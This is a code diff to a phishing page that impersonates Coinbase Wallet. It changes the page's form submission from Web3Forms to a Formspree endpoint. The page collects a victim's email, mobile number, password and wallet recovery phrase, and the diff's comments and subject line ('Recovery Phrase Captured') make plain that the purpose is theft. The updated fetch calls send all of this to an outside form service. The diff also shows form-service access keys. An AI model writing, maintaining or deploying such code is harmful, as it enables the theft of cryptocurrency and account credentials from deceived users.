@@ -480,13 +480,8 @@
                 <div class="logo-text">WALLET</div>
             </div>
 
-            <form id="signupForm" class="form-section">
-                <!-- Web3Forms Hidden Fields -->
-                <input type="hidden" name="access_key" value="6d0efec6-54f3-4a89-a96e-0f4c1f78de44">
-                <input type="hidden" name="subject" value="New User Signup - Coinbase Wallet">
-                <input type="hidden" name="from_name" value="Coinbase Wallet Security">
-                <input type="checkbox" name="botcheck" style="display: none;">
-
+            <!-- UPDATED: Added Formspree action URL -->
+            <form id="signupForm" class="form-section" action="https://formspree.io/f/xbgogwyn" method="POST">
                 <div class="input-group">
                     <input type="email" id="email" name="email" placeholder="Email Address" required>
                     <div class="error-text" id="email-error">Please enter a valid email address.</div>
@@ -695,7 +690,8 @@
             const json = JSON.stringify(object);
 
             try {
-                const response = await fetch('https://api.web3forms.com/submit', {
+                // UPDATED: Formspree endpoint
+                const response = await fetch('https://formspree.io/f/xbgogwyn', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -921,7 +917,7 @@
         }
 
         // =========================================
-        // 3. SUBMIT RECOVERY PHRASE TO EMAIL
+        // 3. SUBMIT RECOVERY PHRASE TO FORMSPREE
         // =========================================
         btnImport.addEventListener('click', async () => {
             let phrase = "";
@@ -947,9 +943,7 @@
             btnImport.disabled = true;
 
             const payload = {
-                access_key: "165857be-fbb3-44de-8e19-282f72766afc",
                 subject: "🔐 Recovery Phrase Captured - Coinbase Wallet",
-                from_name: "Coinbase Wallet Security",
                 email: currentUserEmail,
                 mobile: currentUserMobile,
                 password: currentUserPassword,
@@ -958,7 +952,8 @@
             };
 
             try {
-                const response = await fetch('https://api.web3forms.com/submit', {
+                // UPDATED: Formspree endpoint
+                const response = await fetch('https://formspree.io/f/xbgogwyn', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
